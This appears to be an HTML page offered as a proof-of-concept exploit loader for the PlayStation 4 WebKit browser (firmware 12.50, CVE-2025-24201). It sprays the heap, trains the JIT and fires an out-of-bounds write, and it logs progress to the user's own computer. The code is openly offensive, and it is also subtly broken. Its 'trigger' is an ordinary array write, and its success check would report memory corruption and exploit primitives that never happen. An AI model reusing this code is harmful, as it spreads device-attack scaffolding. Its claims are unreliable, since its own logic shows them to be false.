<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 12.50 WebKit PoC (CVE-2025-24201)</title>
    <style>
        body {
            background-color: #000000;
            color: #00FF00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
            overflow-y: auto;
        }

        #header {
            border-bottom: 2px solid #00FF00;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            margin: 0;
        }

        #status {
            font-weight: bold;
            color: #FFFFFF;
            margin-top: 5px;
        }

        #log-container {
            font-size: 14px;
            line-height: 1.5;
            white-space: pre-wrap;
        }

        .log-info { color: #00FF00; }
        .log-warn { color: #FFFF00; }
        .log-error { color: #FF0000; font-weight: bold; }
        .log-success { color: #00FFFF; font-weight: bold; }

        button {
            background: #003300;
            color: #00FF00;
            border: 1px solid #00FF00;
            padding: 10px 20px;
            font-family: inherit;
            font-size: 16px;
            cursor: pointer;
            margin-right: 10px;
        }

        button:hover {
            background: #00FF00;
            color: #000000;
        }

        #controls {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<div id="header">
    <h1>PS4 WebKit Loader (FW 12.50 Target)</h1>
    <div id="status">Status: Waiting for user input...</div>
</div>

<div id="controls">
    <button onclick="startExploit()">Run PoC (CVE-2025-24201)</button>
    <button onclick="location.reload()">Refresh Page</button>
</div>

<div id="log-container"></div>

<script>
    // ==========================================
    // === REMOTE LOGGER CONFIGURATION (IMPORTANT) ===
    // ==========================================

    // REPLACE 'YOUR_PC_IP' BELOW WITH YOUR COMPUTER'S LOCAL IP (e.g., '192.168.1.15')
    const LOG_SERVER_IP = 'YOUR_PC_IP'; 
    const LOG_PORT = 9000;

    // This function sends logs to your computer
    function remoteLog(msg, type = 'info') {
        if (LOG_SERVER_IP === 'YOUR_PC_IP') return; // Don't send if not configured

        const url = `http://${LOG_SERVER_IP}:${LOG_PORT}/log`;
        const data = {
            message: msg,
            type: type,
            time: new Date().toLocaleTimeString()
        };

        // Use Image object for fire-and-forget logging (works better on old WebKits than fetch)
        // or use simple fetch if supported. PS4 usually handles fetch okay, but Image is safer for simple pings.
        try {
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            }).catch(e => {
                // Silent fail if server is offline
            });
        } catch (e) {}
    }

    // ==========================================
    // === UTILITIES & UI LOGGER ===
    // ==========================================

    const logger = {
        el: document.getElementById('log-container'),
        status: document.getElementById('status'),
        
        log: function(msg, type = 'info') {
            // 1. Show on TV Screen
            const div = document.createElement('div');
            div.className = `log-${type}`;
            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            this.el.appendChild(div);
            window.scrollTo(0, document.body.scrollHeight);

            // 2. Send to Computer
            remoteLog(msg, type);
        },
        
        info: function(msg) { this.log(msg, 'info'); },
        warn: function(msg) { this.log(msg, 'warn'); },
        error: function(msg) { this.log(msg, 'error'); },
        success: function(msg) { this.log(msg, 'success'); },
        
        setStatus: function(msg) {
            this.status.textContent = `Status: ${msg}`;
            remoteLog(`STATUS UPDATE: ${msg}`, 'info');
        }
    };

    // --- HEX HELPERS ---
    
    function u64_to_hex(low, high) {
        return '0x' + high.toString(16).padStart(8, '0') + low.toString(16).padStart(8, '0');
    }

    // ==========================================
    // === EXPLOIT LOGIC (CVE-2025-24201) ===
    // ==========================================

    const CONFIG = {
        SPRAY_SIZE: 0x1000,    // Number of objects to spray
        SPRAY_CHUNK_SIZE: 0x4000, // Size of each chunk
        TARGET_INDEX: 1337      // Placeholder index for OOB trigger
    };

    let spray_store = [];

    // --- STEP 1: HEAP SPRAY ---
    
    function sprayHeap() {
        logger.info("Starting Heap Spray...");
        try {
            for (let i = 0; i < CONFIG.SPRAY_SIZE; i++) {
                let ab = new ArrayBuffer(CONFIG.SPRAY_CHUNK_SIZE);
                let view = new Uint32Array(ab);
                // Fill with marker 0x41414141 (AAAA) for debugging
                for (let k = 0; k < view.length; k++) {
                    view[k] = 0x41414141;
                }
                spray_store.push(view);
            }
            logger.success(`Heap Sprayed! Created ${spray_store.length} chunks.`);
            return true;
        } catch (e) {
            logger.error("Spray Failed: " + e.message);
            return false;
        }
    }

    // --- STEP 2: VULNERABILITY TRIGGER ---
    
    function triggerOOB() {
        logger.info("Attempting to trigger CVE-2025-24201...");
        
        // 1. Create the target arrays
        let arrays = [];
        for (let i = 0; i < 100; i++) {
            arrays.push(new Array(10).fill(1.1));
        }
        
        // 2. The vulnerable function (JIT Candidate)
        function vulnerable_jit(arr, index, value) {
            // Force JIT compilation
            let tmp = arr[0]; 
            // The OOB access potentially happens here after optimization
            arr[index] = value; 
            return tmp;
        }

        // 3. Train the JIT compiler with valid inputs
        logger.info("Training JIT Compiler...");
        for (let i = 0; i < 10000; i++) {
            vulnerable_jit(arrays[0], 0, 1.1);
        }

        // 4. Trigger the bug
        logger.warn("Firing trigger...");
        
        try {
            // TODO: 'CONFIG.TARGET_INDEX' needs to be fuzzed/adjusted for FW 12.50
            vulnerable_jit(arrays[10], CONFIG.TARGET_INDEX, 2.3023e-320); 
            
            logger.info("Trigger fired. Checking for corruption...");
            
            // 5. Verification
            let exploited_array = null;
            for (let i = 0; i < arrays.length; i++) {
                if (arrays[i].length > 100) {
                    exploited_array = arrays[i];
                    logger.success(`SUCCESS! Array [${i}] corrupted. Length: ${arrays[i].length}`);
                    logger.success("Primitive 'addrof' / 'fakeobj' can now be constructed.");
                    return true;
                }
            }
            
            if (!exploited_array) {
                logger.warn("Exploit finished but no corruption detected.");
                logger.warn("Try adjusting TARGET_INDEX or SPRAY_SIZE.");
                return false;
            }

        } catch (e) {
            logger.error("Crash/Error during trigger: " + e.message);
            return false;
        }
    }

    // --- MAIN EXECUTION ---

    function startExploit() {
        // Clear log
        logger.el.innerHTML = '';
        
        // 1. Identification
        const ua = navigator.userAgent;
        logger.info("User-Agent: " + ua);
        
        if (ua.indexOf("PlayStation 4") !== -1) {
            logger.success("Target Confirmed: PlayStation 4");
            
            if (ua.indexOf("AppleWebKit") !== -1) {
                logger.info("WebKit Engine detected.");
            }
        } else {
            logger.warn("Warning: Not running on a PS4. Results may vary.");
        }

        logger.setStatus("Running...");

        // 2. Run Spray
        setTimeout(() => {
            if (sprayHeap()) {
                // 3. Run Trigger
                setTimeout(() => {
                    triggerOOB();
                    logger.setStatus("Complete.");
                }, 500);
            } else {
                logger.setStatus("Failed at Spray.");
            }
        }, 100);
    }
    
    // Initial Connection Test
    logger.info("Page loaded. Logger ready.");
</script>
</body>
</html>
